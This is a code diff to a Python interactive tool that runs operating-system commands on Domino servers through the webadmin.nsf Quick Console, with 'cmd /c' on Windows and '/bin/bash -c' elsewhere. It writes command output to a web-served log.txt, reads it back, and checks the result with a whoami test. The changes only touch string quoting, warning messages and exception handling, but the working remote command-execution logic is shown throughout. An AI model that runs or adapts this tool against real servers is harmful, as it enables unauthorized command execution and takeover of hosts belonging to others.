@@ -60,13 +60,13 @@ class Interactive(cmd.Cmd, object):
 			session.auth = (username, password)
 
 		if os == 'windows':
-			raw_command = 'load cmd /c {0} {1}"{2}\domino\html\download\\filesets\log.txt"'.format(command, operator, path)
+			raw_command = "load cmd /c {0} {1}\"{2}\domino\html\download\\filesets\log.txt\"".format(command, operator, path)
 		else:
-			raw_command = 'load /bin/bash -c "{0} {1}{2}/domino/html/download/filesets/log.txt"'.format(command, operator, path)
+			raw_command = "load /bin/bash -c \"{0} {1}{2}/domino/html/download/filesets/log.txt\"".format(command, operator, path)
 
 		# Quick Console commands must be less than 255 characters
 		if len(raw_command) > 255:
-			utility.print_warn('Your command is too long!')
+			utility.print_warn('Issued command is too long')
 		else:
 			quick_console_url = "{0}/webadmin.nsf/agReadConsoleData$UserL2?OpenAgent&Mode=QuickConsole&Command={1}&1446773019134".format(target, raw_command)
 			response_url = "{0}/download/filesets/log.txt".format(target)
@@ -78,14 +78,14 @@ class Interactive(cmd.Cmd, object):
 				if get_response.status_code == 200 and '>' in operator:
 					print(get_response.text)
 				elif get_response.status_code == 200 and '>' not in operator:
-					utility.print_warn('Unable to delete outfile!')
+					utility.print_warn('Unable to delete outfile')
 				elif get_response.status_code == 404 and '>' not in operator:
 					utility.print_good('Outfile sucessfully deleted')
 				else:
-					utility.print_warn('Outfile not found!')
+					utility.print_warn('Outfile not found')
 					do_exit
 			else:
-				utility.print_warn('Quick Console is unavaliable!')
+				utility.print_warn('Quick Console is unavaliable')
 				do_exit
 
 	def do_EOF(self, line):
@@ -99,7 +99,7 @@ class Interactive(cmd.Cmd, object):
 		return True
 
 	def help_EOF(self):
-		print('Type exit to quit.')
+		print('Type exit to quit')
 
 	do_exit = do_EOF
 	help_exit = help_EOF
@@ -133,7 +133,7 @@ def check_access(target, username, password, auth):
 				local_path = path_regex.search(check_path.text).group(1)
 			else:
 				local_path = None
-				utility.print_warn('Could not identify Domino file path!')
+				utility.print_warn('Could not identify Domino file path')
 
 			# Get operating system
 			if 'UNIX' in check_path.text:
@@ -142,17 +142,17 @@ def check_access(target, username, password, auth):
 				os = 'windows'
 			else:
 				os = 'windows'
-				utility.print_status('Could not identify Domino operating system!')
+				utility.print_warn('Could not identify Domino operating system')
 
 			# Test writing to local file system
 			whoami, path, hostname = test_command(target, os, local_path, username, password, session)
 			if whoami and path:
 				Interactive(target, os, path, username, password, whoami, hostname, session).cmdloop()
 			else:
-				utility.print_warn('Unable to access webadmin.nsf!')
+				utility.print_warn('Unable to access webadmin.nsf')
 
 		else:
-			utility.print_warn("Unable to access {0}, you might not be an admin!".format(webadmin_url))
+			utility.print_warn("Unable to access {0}, might not be an admin".format(webadmin_url))
 
 	except Exception as error:
 		utility.print_error("Error: {0}".format(error))
@@ -186,9 +186,9 @@ def test_command(target, os, path, username, password, session):
 	for local_path in paths:
 		try:
 			if os == 'windows':
-				raw_command = 'load cmd /c whoami > "{0}\domino\html\download\\filesets\log.txt"'.format(local_path)
+				raw_command = "load cmd /c whoami > \"{0}\domino\html\download\\filesets\log.txt\"".format(local_path)
 			else:
-				raw_command = 'load /bin/bash -c "echo $USER:$HOSTNAME > {0}/domino/html/download/filesets/log.txt"'.format(local_path)
+				raw_command = "load /bin/bash -c \"echo $USER:$HOSTNAME > {0}/domino/html/download/filesets/log.txt\"".format(local_path)
 
 			quick_console_url = "{0}/webadmin.nsf/agReadConsoleData$UserL2?OpenAgent&Mode=QuickConsole&Command={1}&1446773019134".format(target, raw_command)
 			response_url = "{0}/download/filesets/log.txt".format(target)
@@ -209,7 +209,7 @@ def test_command(target, os, path, username, password, session):
 						utility.print_good("Running as {0}".format(whoami))
 						break
 
-		except:
+		except Exception as error:
 			continue
 
 	return whoami, local_path, hostname
